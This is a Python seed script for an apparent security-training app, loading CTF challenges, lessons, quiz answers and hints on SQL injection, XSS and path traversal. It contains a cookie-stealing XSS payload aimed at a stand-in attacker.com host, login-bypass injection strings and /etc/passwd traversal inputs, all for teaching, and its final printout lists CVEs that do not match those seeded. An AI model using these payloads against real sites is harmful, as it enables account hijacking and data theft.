"""
Populates the database

Usage: python seed.py

Test user credentials: student / password123
"""

from werkzeug.security import generate_password_hash

from app import create_app, db
from app.models import (
    Account, CTF, Vulnerability, Question, Hint,
    CVE, CVEVulnerability,
)


def seed():
    app = create_app()
    with app.app_context():
        db.drop_all()
        db.create_all()

        # ------------------------------------------------------------------
        # Users
        # ------------------------------------------------------------------
        student = Account(
            username="student",
            email="student@example.com",
            passwordHash=generate_password_hash("password123"),
        )
        db.session.add(student)

        # ------------------------------------------------------------------
        # CTF challenges (created before vulnerabilities due to FK)
        # ------------------------------------------------------------------
        ctf_sqli = CTF(
            description=(
                "Use SQL injection to bypass the login form and authenticate as 'admin' "
                "without knowing the password.\n\n"
                "The backend query is:\n"
                "  SELECT * FROM users WHERE username='<input>' AND password='<input>'\n\n"
                "Find an input that always evaluates to TRUE and comments out the rest."
            ),
            path="/api/challenges/sqli_login.zip",
            flag="sqli_bypass_success",
        )
        ctf_xss = CTF(
            description=(
                "Inject a persistent XSS payload into the comment field of a blog page.\n\n"
                "Your goal: steal the admin's session cookie and send it to "
                "http://attacker.local/steal?c=COOKIE.\n\n"
                "The page does NOT sanitise or encode user input before rendering."
            ),
            path="/api/challenges/xss_cookie.zip",
            flag="xss_cookie_stolen",
        )
        ctf_pt = CTF(
            description=(
                "Exploit a path traversal vulnerability in a file-download endpoint:\n"
                "  GET /download?file=<filename>\n\n"
                "The server returns the contents of the requested file from /var/www/files/. "
                "Read /etc/passwd and find the flag hidden in the last comment field."
            ),
            path="/api/challenges/path_traversal.zip",
            flag="path_traversal_lfi",
        )
        db.session.add_all([ctf_sqli, ctf_xss, ctf_pt])
        db.session.flush()

        # ------------------------------------------------------------------
        # Vulnerabilities
        # ------------------------------------------------------------------
        vuln_sqli = Vulnerability(
            name="SQL Injection",
            ctfId=ctf_sqli.ctfId,
            description=(
                "SQL Injection (SQLi) is a web security vulnerability that allows an attacker "
                "to interfere with the queries that an application makes to its database.\n\n"
                "Attackers can use it to:\n"
                "• View data they are not normally able to retrieve\n"
                "• Bypass authentication (e.g. login without a password)\n"
                "• Modify or delete data\n"
                "• In severe cases, execute OS commands on the server\n\n"
                "Example vulnerable query:\n"
                "  SELECT * FROM users WHERE username='<user>' AND password='<pass>'\n\n"
                "With input  admin'--  this becomes:\n"
                "  SELECT * FROM users WHERE username='admin'--' AND password=''\n\n"
                "The -- comments out the password check, allowing login without a password.\n\n"
                "Prevention: use parameterised queries / prepared statements, validate and "
                "whitelist input, apply least-privilege to DB accounts."
            ),
        )
        vuln_xss = Vulnerability(
            name="Cross-Site Scripting (XSS)",
            ctfId=ctf_xss.ctfId,
            description=(
                "Cross-Site Scripting (XSS) is a client-side code injection attack.\n\n"
                "Types of XSS:\n"
                "1. Reflected - payload comes from the current HTTP request\n"
                "2. Stored   - payload is saved in the database and served to all visitors\n"
                "3. DOM-based - vulnerability exists in client-side JavaScript\n\n"
                "XSS can be used to:\n"
                "• Steal session cookies and hijack accounts\n"
                "• Redirect users to phishing sites\n"
                "• Deface web pages\n"
                "• Perform actions on behalf of the victim\n\n"
                "Classic payload:\n"
                "  <script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n\n"
                "Prevention: HTML-encode all user-supplied output, use Content-Security-Policy "
                "headers, avoid innerHTML with untrusted data."
            ),
        )
        vuln_pt = Vulnerability(
            name="Path Traversal",
            ctfId=ctf_pt.ctfId,
            description=(
                "Path Traversal (Directory Traversal) lets an attacker read arbitrary files "
                "on the server by manipulating file-path input.\n\n"
                "Common targets:\n"
                "• /etc/passwd  - Linux user list\n"
                "• /etc/shadow  - Hashed passwords (requires root)\n"
                "• Application source code and config files with credentials\n\n"
                "The attack uses ../ sequences to escape the intended directory:\n"
                "  /download?file=../../../../etc/passwd\n\n"
                "URL-encoded variants bypass naive filters:\n"
                "  %2e%2e%2f  ->  ../\n"
                "  %2e%2e/    ->  ../\n\n"
                "Prevention: resolve the canonical path and verify it starts with the allowed "
                "base directory; use a whitelist of permitted files; never pass user input "
                "directly to filesystem APIs."
            ),
        )
        db.session.add_all([vuln_sqli, vuln_xss, vuln_pt])
        db.session.flush()

        # ------------------------------------------------------------------
        # Questions
        # ------------------------------------------------------------------
        questions = [
            # SQL Injection
            Question(vulnId=vuln_sqli.vulnId, questionNumber=1,
                     question="What two-character SQL sequence comments out the remainder of a query?",
                     answer="--"),
            Question(vulnId=vuln_sqli.vulnId, questionNumber=2,
                     question="Which SQL keyword merges the results of two SELECT statements, "
                              "often used in SQLi to extract data from other tables?",
                     answer="UNION"),
            Question(vulnId=vuln_sqli.vulnId, questionNumber=3,
                     question="Which SQL clause is most commonly manipulated in a login-bypass "
                              "SQL injection attack to make a condition always true?",
                     answer="WHERE"),

            # XSS
            Question(vulnId=vuln_xss.vulnId, questionNumber=1,
                     question="What HTML tag is most commonly injected in an XSS attack to run "
                              "client-side code?",
                     answer="script"),
            Question(vulnId=vuln_xss.vulnId, questionNumber=2,
                     question="Which JavaScript property exposes a user's session identifier "
                              "and is a primary target in XSS cookie-theft attacks?",
                     answer="document.cookie"),
            Question(vulnId=vuln_xss.vulnId, questionNumber=3,
                     question="What type of XSS permanently stores the malicious payload in "
                              "the server's database so every visitor is affected?",
                     answer="stored"),

            # Path Traversal
            Question(vulnId=vuln_pt.vulnId, questionNumber=1,
                     question="What character sequence is used in a path traversal attack to "
                              "move up one directory level on Unix systems?",
                     answer="../"),
            Question(vulnId=vuln_pt.vulnId, questionNumber=2,
                     question="What sensitive Linux file is a classic path traversal target "
                              "because it lists all system user accounts?",
                     answer="/etc/passwd"),
            Question(vulnId=vuln_pt.vulnId, questionNumber=3,
                     question="What is the URL-percent-encoded form of ../ that can bypass "
                              "simple string-match filters?",
                     answer="%2e%2e%2f"),
        ]
        db.session.add_all(questions)
        db.session.flush()

        q = {q.questionNumber: q for q in questions if q.vulnId == vuln_sqli.vulnId}
        q2 = {q.questionNumber: q for q in questions if q.vulnId == vuln_xss.vulnId}
        q3 = {q.questionNumber: q for q in questions if q.vulnId == vuln_pt.vulnId}

        # ------------------------------------------------------------------
        # Hints
        # ------------------------------------------------------------------
        hints = [
            # SQLi Q1
            Hint(questionId=questions[0].questionId, hintNumber=1,
                 hint="This sequence starts with two dashes. Everything after it is ignored."),
            Hint(questionId=questions[0].questionId, hintNumber=2,
                 hint="Literally two dashes: --  Try: admin'--"),

            # SQLi Q2
            Hint(questionId=questions[1].questionId, hintNumber=1,
                 hint="Think about set operations that combine multiple result sets."),
            Hint(questionId=questions[1].questionId, hintNumber=2,
                 hint="The keyword is UNION. Used like: ' UNION SELECT null,null--"),

            # SQLi Q3
            Hint(questionId=questions[2].questionId, hintNumber=1,
                 hint="This clause filters rows in a SELECT. Attackers add OR 1=1 to bypass it."),
            Hint(questionId=questions[2].questionId, hintNumber=2,
                 hint="WHERE clause. The injection: ' OR '1'='1 makes it always true."),

            # XSS Q1
            Hint(questionId=questions[3].questionId, hintNumber=1,
                 hint="This HTML element embeds executable code. Its name matches the language."),
            Hint(questionId=questions[3].questionId, hintNumber=2,
                 hint="<script>alert('XSS')</script> - the tag is 'script'."),

            # XSS Q2
            Hint(questionId=questions[4].questionId, hintNumber=1,
                 hint="Browsers store small key=value pairs for session tracking. JS can read them."),
            Hint(questionId=questions[4].questionId, hintNumber=2,
                 hint="Access it via document.cookie in JavaScript."),

            # XSS Q3
            Hint(questionId=questions[5].questionId, hintNumber=1,
                 hint="Unlike reflected XSS (one request), this variant persists in the database."),
            Hint(questionId=questions[5].questionId, hintNumber=2,
                 hint="It's called stored XSS (also known as persistent XSS)."),

            # Path Traversal Q1
            Hint(questionId=questions[6].questionId, hintNumber=1,
                 hint="It's a two-character sequence plus a separator: dot dot slash."),
            Hint(questionId=questions[6].questionId, hintNumber=2,
                 hint="../  (two dots then a forward slash)"),

            # Path Traversal Q2
            Hint(questionId=questions[7].questionId, hintNumber=1,
                 hint="It lives in /etc/ and historically stored hashed passwords but now just lists users."),
            Hint(questionId=questions[7].questionId, hintNumber=2,
                 hint="The file is /etc/passwd"),

            # Path Traversal Q3
            Hint(questionId=questions[8].questionId, hintNumber=1,
                 hint="URL encoding converts characters to %XX hex pairs. Dot(.) = %2e, slash(/) = %2f."),
            Hint(questionId=questions[8].questionId, hintNumber=2,
                 hint="%2e%2e%2f encodes ../  (dot=2e, dot=2e, slash=2f)"),
        ]
        db.session.add_all(hints)

        # ------------------------------------------------------------------
        # CVEs
        # ------------------------------------------------------------------
        cves = [
            CVE(
                cveId="CVE-2025-46052",
                description=(
                    "Vulnerability: SQL Injection\n\n"
                    "An error-based SQL Injection (SQLi) vulnerability in WebERP v4.15.2 allows"
                    "attackers to execute arbitrary SQL command and extract sensitive data by "
                    "injecting a crafted payload into the DEL form field in a POST request to "
                    "/StockCounts.php\n\n"
                    "Official report: https://nvd.nist.gov/vuln/detail/CVE-2025-46052\n"
                    "Exploit info at: https://github.com/johnchd/CVEs/blob/main/WebERP/CVE-2025-46052%20-%20SQLi.md"
                ),
            ),
            CVE(
                cveId="CVE-2025-49717",
                description=(
                    "Vulnerability: Buffer Overflow\n\n"
                    "Heap-based buffer overflow in SQL Server allows an authorized attacker to "
                    "execute code over a network.\n\n"
                    "Official report: https://nvd.nist.gov/vuln/detail/CVE-2025-49717\n"
                    "Microsoft's report: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49717"
                ),
            ),
            CVE(
                cveId="CVE-2021-46667",
                description=(
                    "Vulnerability: Integer Overflow\n\n"
                    "MariaDB before 10.6.5 has a sql_lex.cc integer overflow, leading to "
                    "an application crash.\n\n"
                    "Official report: https://nvd.nist.gov/vuln/detail/CVE-2021-46667\n"
                    "Additional info: https://www.sentinelone.com/vulnerability-database/cve-2021-46667/"
                ),
            ),
            CVE(
                cveId="CVE-2026-33827",
                description=(
                    "Vulnerability: Race Condition\n\n"
                    "Concurrent execution using shared resource with improper synchronization"
                    "('race condition') in Windows TCP/IP allows an unauthorized attacker to "
                    "execute code over a network.\n\n"
                    "Official report: https://nvd.nist.gov/vuln/detail/CVE-2026-33827\n"
                    "Additional info: https://www.sentinelone.com/vulnerability-database/cve-2026-33827/"
                ),
            ),
            CVE(
                cveId="CVE-2026-2441",
                description=(
                    "Vulnerability: Use After Free\n\n"
                    "Use after free in CSS in Google Chrome prior to 145.0.7632.75 allowed a "
                    "remote attacker to execute arbitrary code inside a sandbox via a "
                    "crafted HTML page. (Chromium security severity: High)\n\n"
                    "Official report: https://nvd.nist.gov/vuln/detail/cve-2026-2441\n"
                    "Additional info: https://www.sentinelone.com/vulnerability-database/cve-2026-2441/"
                ),
            ),
        ]
        db.session.add_all(cves)
        db.session.flush()

        # ------------------------------------------------------------------
        # CVE -> Vulnerability links
        # ------------------------------------------------------------------
        links = [
            CVEVulnerability(cveId="CVE-2025-46052", vulnId=vuln_sqli.vulnId),
            # CVEVulnerability(cveId="CVE-2025-49717", vulnId=vuln_buff_over.vulnId),
            # CVEVulnerability(cveId="CVE-2021-46667", vulnId=vuln_int_over.vulnId),
            # CVEVulnerability(cveId="CVE-2026-33827", vulnId=vuln_race_cond.vulnId),
            # CVEVulnerability(cveId="CVE-2026-2441", vulnId=vuln_uaf.vulnId),
        ]
        db.session.add_all(links)

        db.session.commit()

    print("Database seeded successfully!")
    print("Test credentials:")
    print("  Username : student")
    print("  Password : password123")
    print("Vulnerabilities seeded: SQL Injection, XSS, Path Traversal")
    print("CVEs seeded : CVE-2025-46052, CVE-2017-0144, CVE-2014-0160, CVE-2019-11043, CVE-2020-1938")


if __name__ == "__main__":
    seed()
